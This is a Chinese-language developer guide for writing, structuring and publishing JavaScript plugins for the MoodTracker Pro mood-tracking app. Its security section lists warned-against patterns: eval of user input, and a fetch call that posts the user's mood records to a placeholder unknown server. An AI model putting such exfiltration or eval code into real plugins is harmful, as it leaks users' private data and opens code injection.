# 🧩 MoodTracker Pro - 插件开发指南

## 📋 目录
1. [插件系统概述](#插件系统概述)
2. [插件结构](#插件结构)
3. [开发示例](#开发示例)
4. [发布到插件市场](#发布到插件市场)
5. [最佳实践](#最佳实践)

---

## 🎯 插件系统概述

MoodTracker Pro 的插件系统允许开发者扩展应用功能，无需修改核心代码。

### 特点
- ✅ **纯JavaScript** - 无需编译
- ✅ **GitHub托管** - 完全免费
- ✅ **即时加载** - 无需重启应用
- ✅ **完整API** - 访问所有数据和功能
- ✅ **事件驱动** - 响应应用事件

---

## 📦 插件结构

### 最小插件示例

```javascript
// my-plugin.js
(function() {
    const plugin = {
        // 基本信息
        name: 'My Plugin',
        version: '1.0.0',
        author: 'Your Name',
        description: '插件描述',
        
        // 初始化函数（必需）
        init: function(api) {
            console.log(`${this.name} 已加载`);
            
            // 使用API
            api.on('moodSaved', (data) => {
                console.log('心情已保存:', data);
            });
        },
        
        // 卸载函数（可选）
        destroy: function() {
            console.log(`${this.name} 已卸载`);
        }
    };
    
    // 自动注册插件
    if (window.MoodTrackerAPI) {
        window.MoodTrackerAPI.registerPlugin(plugin);
    } else {
        document.addEventListener('DOMContentLoaded', () => {
            window.MoodTrackerAPI.registerPlugin(plugin);
        });
    }
})();
```

### 完整插件模板

```javascript
// advanced-plugin.js
(function() {
    'use strict';
    
    const plugin = {
        // ============ 元数据 ============
        name: 'Advanced Plugin',
        version: '1.0.0',
        author: 'Developer Name',
        email: 'dev@example.com',
        website: 'https://github.com/yourusername/plugin',
        description: 'A powerful plugin that extends MoodTracker Pro',
        
        // 依赖项（可选）
        dependencies: [],
        
        // 配置项
        config: {
            enabled: true,
            apiKey: '',
            interval: 60000
        },
        
        // ============ 生命周期 ============
        init: function(api) {
            this.api = api;
            this.listeners = [];
            
            console.log(`🔌 ${this.name} v${this.version} initialized`);
            
            // 加载配置
            this.loadConfig();
            
            // 注册事件监听器
            this.registerEventListeners();
            
            // 启动定时任务
            if (this.config.enabled) {
                this.startBackgroundTask();
            }
        },
        
        destroy: function() {
            // 清理事件监听器
            this.listeners.forEach(({ event, handler }) => {
                this.api.off(event, handler);
            });
            
            // 停止定时任务
            if (this.interval) {
                clearInterval(this.interval);
            }
            
            console.log(`🔌 ${this.name} destroyed`);
        },
        
        // ============ 配置管理 ============
        loadConfig: function() {
            const saved = localStorage.getItem(`plugin_${this.name}_config`);
            if (saved) {
                this.config = { ...this.config, ...JSON.parse(saved) };
            }
        },
        
        saveConfig: function() {
            localStorage.setItem(`plugin_${this.name}_config`, JSON.stringify(this.config));
        },
        
        // ============ 事件处理 ============
        registerEventListeners: function() {
            const handlers = {
                'moodSaved': this.onMoodSaved.bind(this),
                'moodUpdated': this.onMoodUpdated.bind(this),
                'moodDeleted': this.onMoodDeleted.bind(this)
            };
            
            for (const [event, handler] of Object.entries(handlers)) {
                this.api.on(event, handler);
                this.listeners.push({ event, handler });
            }
        },
        
        onMoodSaved: function(data) {
            console.log('Mood saved:', data);
            // 处理心情保存事件
        },
        
        onMoodUpdated: function(data) {
            console.log('Mood updated:', data);
        },
        
        onMoodDeleted: function(data) {
            console.log('Mood deleted:', data);
        },
        
        // ============ 后台任务 ============
        startBackgroundTask: function() {
            this.interval = setInterval(() => {
                this.backgroundTask();
            }, this.config.interval);
        },
        
        backgroundTask: function() {
            // 执行定期任务
            console.log('Background task running...');
        },
        
        // ============ 自定义功能 ============
        customMethod: function() {
            const moods = this.api.getMoods();
            // 处理数据...
            return moods;
        }
    };
    
    // 注册插件
    if (window.MoodTrackerAPI) {
        window.MoodTrackerAPI.registerPlugin(plugin);
    } else {
        document.addEventListener('DOMContentLoaded', () => {
            window.MoodTrackerAPI.registerPlugin(plugin);
        });
    }
})();
```

---

## 🎨 开发示例

### 示例1：天气集成插件

```javascript
// weather-plugin.js
(function() {
    const plugin = {
        name: 'Weather Integration',
        version: '1.0.0',
        author: 'WeatherDev',
        description: '自动记录每次心情记录时的天气状况',
        
        config: {
            apiKey: '', // OpenWeatherMap API key
            units: 'metric'
        },
        
        init: function(api) {
            this.api = api;
            this.loadConfig();
            
            // 监听心情保存
            api.on('moodSaved', async (data) => {
                if (!this.config.apiKey) {
                    console.warn('Weather plugin: API key not configured');
                    return;
                }
                
                try {
                    const weather = await this.fetchWeather();
                    console.log(`Weather: ${weather.description}, ${weather.temp}°C`);
                    
                    // 可以将天气信息添加到笔记中
                    const note = data.mood.note || '';
                    const updatedNote = `${note}\n\n[Weather: ${weather.description}, ${weather.temp}°C]`;
                    
                    api.updateMood(data.mood.id, { note: updatedNote });
                } catch (error) {
                    console.error('Failed to fetch weather:', error);
                }
            });
        },
        
        fetchWeather: async function() {
            // 获取位置
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject);
            });
            
            const { latitude, longitude } = position.coords;
            
            // 获取天气
            const url = `https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&appid=${this.config.apiKey}&units=${this.config.units}`;
            const response = await fetch(url);
            const data = await response.json();
            
            return {
                description: data.weather[0].description,
                temp: Math.round(data.main.temp),
                humidity: data.main.humidity,
                icon: data.weather[0].icon
            };
        },
        
        loadConfig: function() {
            const saved = localStorage.getItem('plugin_Weather_config');
            if (saved) {
                this.config = { ...this.config, ...JSON.parse(saved) };
            }
        }
    };
    
    if (window.MoodTrackerAPI) {
        window.MoodTrackerAPI.registerPlugin(plugin);
    }
})();
```

### 示例2：GitHub提交统计插件

```javascript
// github-commits-plugin.js
(function() {
    const plugin = {
        name: 'GitHub Commits',
        version: '1.0.0',
        author: 'GitHubDev',
        description: '关联GitHub提交统计与心情数据',
        
        config: {
            username: '',
            token: '' // GitHub Personal Access Token (optional)
        },
        
        init: function(api) {
            this.api = api;
            this.loadConfig();
            
            // 每天获取一次GitHub提交数据
            this.syncGitHubCommits();
            setInterval(() => this.syncGitHubCommits(), 24 * 60 * 60 * 1000);
        },
        
        syncGitHubCommits: async function() {
            if (!this.config.username) return;
            
            try {
                const commits = await this.fetchGitHubCommits();
                console.log(`Found ${commits.length} commits today`);
                
                // 可以将提交数据关联到当天的心情记录
                const moods = this.api.getMoods();
                const today = moods.filter(m => {
                    const moodDate = new Date(m.date).toDateString();
                    const todayDate = new Date().toDateString();
                    return moodDate === todayDate;
                });
                
                if (today.length > 0 && commits.length > 0) {
                    const note = today[0].note || '';
                    const commitNote = `\n\n[GitHub: ${commits.length} commits today]`;
                    
                    this.api.updateMood(today[0].id, {
                        note: note + commitNote
                    });
                }
            } catch (error) {
                console.error('Failed to sync GitHub commits:', error);
            }
        },
        
        fetchGitHubCommits: async function() {
            const today = new Date().toISOString().split('T')[0];
            const url = `https://api.github.com/search/commits?q=author:${this.config.username}+committer-date:${today}`;
            
            const headers = {
                'Accept': 'application/vnd.github.cloak-preview+json'
            };
            
            if (this.config.token) {
                headers['Authorization'] = `token ${this.config.token}`;
            }
            
            const response = await fetch(url, { headers });
            const data = await response.json();
            
            return data.items || [];
        },
        
        loadConfig: function() {
            const saved = localStorage.getItem('plugin_GitHub_config');
            if (saved) {
                this.config = { ...this.config, ...JSON.parse(saved) };
            }
        }
    };
    
    if (window.MoodTrackerAPI) {
        window.MoodTrackerAPI.registerPlugin(plugin);
    }
})();
```

### 示例3：数据可视化增强插件

```javascript
// advanced-charts-plugin.js
(function() {
    const plugin = {
        name: 'Advanced Charts',
        version: '1.0.0',
        author: 'ChartsDev',
        description: '添加更多图表类型和可视化选项',
        
        init: function(api) {
            this.api = api;
            
            // 添加新的图表方法到API
            api.createHeatmap = this.createHeatmap.bind(this);
            api.createRadarChart = this.createRadarChart.bind(this);
            
            console.log('Advanced Charts loaded! Use api.createHeatmap() and api.createRadarChart()');
        },
        
        createHeatmap: function(containerId) {
            const moods = this.api.getMoods();
            
            // 按日期分组
            const heatmapData = {};
            moods.forEach(mood => {
                const date = new Date(mood.date).toISOString().split('T')[0];
                heatmapData[date] = mood.mood;
            });
            
            // 创建热力图（简化版）
            const container = document.getElementById(containerId);
            if (!container) return;
            
            let html = '<div class="heatmap">';
            for (const [date, mood] of Object.entries(heatmapData)) {
                const color = this.getMoodColor(mood);
                html += `<div class="heatmap-cell" style="background-color: ${color}" title="${date}: ${mood}/5"></div>`;
            }
            html += '</div>';
            
            container.innerHTML = html;
        },
        
        createRadarChart: function(containerId) {
            // 创建雷达图显示不同方面的心情
            console.log('Radar chart created in', containerId);
        },
        
        getMoodColor: function(mood) {
            const colors = [
                '#dc3545', // Very Bad
                '#fd7e14', // Bad
                '#ffc107', // Neutral
                '#28a745', // Good
                '#00ff88'  // Excellent
            ];
            return colors[mood - 1] || '#666';
        }
    };
    
    if (window.MoodTrackerAPI) {
        window.MoodTrackerAPI.registerPlugin(plugin);
    }
})();
```

---

## 🌐 发布到插件市场

### 步骤1：创建GitHub仓库

```bash
# 1. 创建新仓库
mkdir moodtracker-weather-plugin
cd moodtracker-weather-plugin

# 2. 初始化
git init
```

### 步骤2：创建插件文件

```
moodtracker-weather-plugin/
├── plugin.js          # 插件主文件
├── README.md          # 说明文档
├── LICENSE           # 开源协议
└── manifest.json     # 插件清单
```

### 步骤3：编写manifest.json

```json
{
  "name": "Weather Integration",
  "version": "1.0.0",
  "description": "Automatically record weather conditions with mood entries",
  "author": "Your Name",
  "email": "your@email.com",
  "homepage": "https://github.com/yourusername/moodtracker-weather-plugin",
  "license": "MIT",
  "main": "plugin.js",
  "category": "integration",
  "tags": ["weather", "integration", "automation"],
  "screenshots": [
    "https://raw.githubusercontent.com/yourusername/repo/main/screenshot1.png"
  ],
  "minAppVersion": "1.0.0",
  "dependencies": [],
  "permissions": [
    "geolocation",
    "fetch"
  ]
}
```

### 步骤4：提交到GitHub

```bash
git add .
git commit -m "Initial commit"
git remote add origin https://github.com/yourusername/moodtracker-weather-plugin.git
git push -u origin main
```

### 步骤5：添加到插件市场

创建Pull Request到插件市场仓库：
```
https://github.com/moodtracker-pro/plugins
```

在plugins.json中添加：
```json
{
  "id": "weather-integration",
  "name": "Weather Integration",
  "author": "Your Name",
  "version": "1.0.0",
  "description": "Automatically record weather conditions",
  "category": "integration",
  "repository": "https://github.com/yourusername/moodtracker-weather-plugin",
  "main": "https://raw.githubusercontent.com/yourusername/moodtracker-weather-plugin/main/plugin.js",
  "manifest": "https://raw.githubusercontent.com/yourusername/moodtracker-weather-plugin/main/manifest.json",
  "icon": "fas fa-cloud-sun",
  "downloads": 0,
  "rating": 0,
  "verified": false
}
```

---

## ✅ 最佳实践

### 1. 代码质量

```javascript
// ✅ 好的做法
(function() {
    'use strict';
    
    const plugin = {
        name: 'MyPlugin',
        
        init: function(api) {
            try {
                // 安全的初始化代码
                this.api = api;
            } catch (error) {
                console.error('Plugin init failed:', error);
            }
        }
    };
    
    // 安全注册
    if (window.MoodTrackerAPI) {
        window.MoodTrackerAPI.registerPlugin(plugin);
    }
})();

// ❌ 不好的做法
var plugin = {
    init: function() {
        // 未包裹在IIFE中
        // 可能污染全局作用域
    }
};
```

### 2. 错误处理

```javascript
// ✅ 始终处理错误
async fetchData() {
    try {
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }
        return await response.json();
    } catch (error) {
        console.error('Fetch failed:', error);
        this.api.showToast('Failed to load data');
        return null;
    }
}
```

### 3. 性能优化

```javascript
// ✅ 使用节流和防抖
init: function(api) {
    this.api = api;
    
    // 节流：最多每秒执行一次
    const throttledUpdate = this.throttle(() => {
        this.updateData();
    }, 1000);
    
    api.on('moodSaved', throttledUpdate);
},

throttle: function(func, limit) {
    let inThrottle;
    return function() {
        if (!inThrottle) {
            func.apply(this, arguments);
            inThrottle = true;
            setTimeout(() => inThrottle = false, limit);
        }
    };
}
```

### 4. 用户隐私

```javascript
// ✅ 尊重用户隐私
init: function(api) {
    // 请求权限
    this.requestPermission();
    
    // 明确告知用户数据用途
    console.log('This plugin will access your mood data for analysis');
},

requestPermission: async function() {
    const consent = confirm('Allow this plugin to access your location?');
    if (!consent) {
        console.log('Permission denied');
        return false;
    }
    return true;
}
```

### 5. 文档化

```javascript
/**
 * Weather Integration Plugin
 * 
 * @description Automatically records weather conditions with mood entries
 * @version 1.0.0
 * @author Your Name
 * 
 * Configuration:
 * - apiKey: OpenWeatherMap API key (required)
 * - units: Temperature units (metric/imperial)
 * 
 * Events:
 * - Listens to: moodSaved
 * - Emits: weatherFetched
 */
```

---

## 🔒 安全指南

### 避免的危险操作

```javascript
// ❌ 不要使用eval
eval(userInput);  // 极度危险！

// ❌ 不要直接操作DOM（可能破坏应用）
document.body.innerHTML = '';

// ❌ 不要发送用户数据到未知服务器
fetch('https://unknown-server.com', {
    method: 'POST',
    body: JSON.stringify(api.getMoods())  // 隐私泄露！
});

// ❌ 不要覆盖核心API方法
api.getMoods = function() { return []; };  // 破坏性操作！
```

### 安全的做法

```javascript
// ✅ 验证输入
validateInput: function(input) {
    if (typeof input !== 'string') return false;
    if (input.length > 1000) return false;
    return true;
},

// ✅ 只读取必要的数据
getRecentMoods: function() {
    const moods = this.api.getMoods();
    return moods.slice(-7);  // 只获取最近7天
},

// ✅ 明确权限需求
permissions: [
    'read:moods',    // 读取心情数据
    'geolocation'    // 获取位置
]
```

---

## 🎓 学习资源

- **MoodTracker Pro API文档**: `API使用文档.md`
- **插件示例仓库**: https://github.com/moodtracker-pro/example-plugins
- **插件市场**: 应用内访问
- **开发者社区**: GitHub Discussions

---

## 📞 获取帮助

- **GitHub Issues**: 报告bug或请求功能
- **Discussions**: 技术讨论和问题解答
- **Email**: support@moodtracker.pro

---

**祝您开发愉快！** 🚀

期待看到您创建的精彩插件！
